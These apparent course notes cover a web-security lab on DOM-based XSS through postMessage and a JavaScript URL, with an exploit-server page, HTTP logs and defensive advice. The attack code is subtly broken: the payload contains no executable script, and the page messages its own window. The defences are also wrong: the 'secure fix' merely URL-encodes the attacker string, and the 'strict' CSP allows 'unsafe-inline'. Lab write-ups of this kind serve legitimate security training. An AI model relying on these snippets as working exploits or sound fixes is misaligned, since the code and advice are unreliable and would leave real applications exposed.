---
course: Web Security
topic: DOM-based Vulnerabilities
tags: [web-security]
---

## Lab 2: DOM XSS Using Web Messages and JavaScript URL

This lab focuses on exploiting a DOM-based XSS vulnerability using web messages and a JavaScript URL. We will walk through the steps to inject a malicious payload and bypass certain checks.

### Understanding `postMessage`

The `postMessage` method is used for secure cross-origin communication between Window objects (like between a webpage and a popup window, or between a webpage and an iframe). It takes two parameters:

1. **message**: The data to be sent. This can be a string, object, array, etc.
2. **targetOrigin**: The origin of the receiving window. This can be a specific URL or `"*"` to allow any origin.

#### Syntax

```javascript
window.postMessage(message, targetOrigin);
```

### Injecting Malicious Payload

In this lab, we need to inject a malicious payload that contains either `http:` or `https:`. The payload will be executed using a JavaScript URL.

#### Step-by-Step Injection

1. **Identify the Check**: The application has a check that ensures the payload contains `http:` or `https:`.
2. **Craft the Payload**: We can craft a payload that includes these strings but still executes JavaScript. For example, we can use `javascript:` followed by a comment to bypass the check.

```javascript
// Malicious payload
var payload = "javascript://comment/http://example.com";
```

3. **Inject the Payload**: Use `postMessage` to send the payload to the target origin.

```javascript
// Inject the payload
window.postMessage(payload, "*");
```

### Full Example

Let's put this together in a complete example. Suppose the application URL is `http://example.com`.

1. **Copy the Application URL**:
   - Copy the URL of the application (`http://example.com`).

2. **Prepare the Exploit Server**:
   - Set up an attacker-controlled server to host the exploit.
   - Add the exploit code to the server.

```html
<!-- Exploit server code -->
<!DOCTYPE html>
<html>
<head>
    <title>Exploit Server</title>
</head>
<body>
    <script>
        // Inject the payload
        var payload = "javascript://comment/http://example.com";
        window.postMessage(payload, "*");
    </script>
</body>
</html>
```

3. **View the Exploit**:
   - Open the exploit server in your browser to ensure the payload is working correctly.

4. **Deliver the Exploit to the Victim**:
   - Once confirmed, deliver the exploit to the victim user.

### HTTP Details

Here is the full HTTP request and response for the exploit:

#### HTTP Request

```http
GET /exploit.html HTTP/1.1
Host: attacker-controlled-server.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 204
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Exploit Server</title>
</head>
<body>
    <script>
        var payload = "javascript://comment/http://example.com";
        window.postMessage(payload, "*");
    </script>
</body>
</html>
```

### Pitfalls and Common Mistakes

1. **Incorrect Target Origin**: Ensure the `targetOrigin` is set correctly. Using `"*"` can expose your application to unintended origins.
2. **Improper Validation**: Always validate and sanitize inputs to prevent injection attacks.
3. **Missing Content Security Policy (CSP)**: Implement a strict CSP to mitigate the impact of XSS attacks.

### How to Prevent / Defend

#### Detection

1. **Automated Scanning Tools**: Use tools like Burp Suite, OWASP ZAP, or commercial scanners to detect potential DOM-based XSS vulnerabilities.
2. **Manual Code Review**: Regularly review code for improper handling of user inputs and lack of validation.

#### Prevention

1. **Input Validation and Sanitization**: Validate and sanitize all user inputs to ensure they meet expected formats.
2. **Content Security Policy (CSP)**: Implement a strict CSP to restrict the sources of executable scripts.

```javascript
// Secure code example
var safePayload = encodeURIComponent("javascript://comment/http://example.com");
window.postMessage(safePayload, "*");
```

#### Secure Coding Fixes

Compare the vulnerable and secure versions side by side:

```diff
- var payload = "javascript://comment/http://example.com";
+ var safePayload = encodeURIComponent("javascript://comment/http://example.com");

- window.postMessage(payload, "*");
+ window.postMessage(safePayload, "*");
```

#### Configuration Hardening

1. **Set Strict CSP**: Configure your web server to enforce a strict CSP.

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'";
```

2. **Use HTTP Headers**: Implement additional security headers like `X-Content-Type-Options`, `X-XSS-Protection`, and `Strict-Transport-Security`.

```nginx
add_header X-Content-Type-Options nosniff;
add_header X-XSS-Protection "1; mode=block";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
```

### Practice Labs

For hands-on practice with DOM-based XSS, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on various web security topics, including DOM-based XSS.
- **OWASP Juice Shop**: A deliberately insecure web app for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: Provides a variety of web vulnerabilities for testing and learning.

These labs provide a controlled environment to practice and understand the concepts thoroughly.

By understanding the underlying principles and practical applications, you can effectively identify, exploit, and defend against DOM-based vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/06-DOM-based Vulnerabilities/02-Lab 2 DOM XSS using web messages and a JavaScript URL/01-Introduction to DOM-Based Vulnerabilities|Introduction to DOM-Based Vulnerabilities]] | [[Web Security (PortSwigger)/06-DOM-based Vulnerabilities/02-Lab 2 DOM XSS using web messages and a JavaScript URL/00-Overview|Overview]] | [[03-Understanding DOM-Based Vulnerabilities|Understanding DOM-Based Vulnerabilities]]
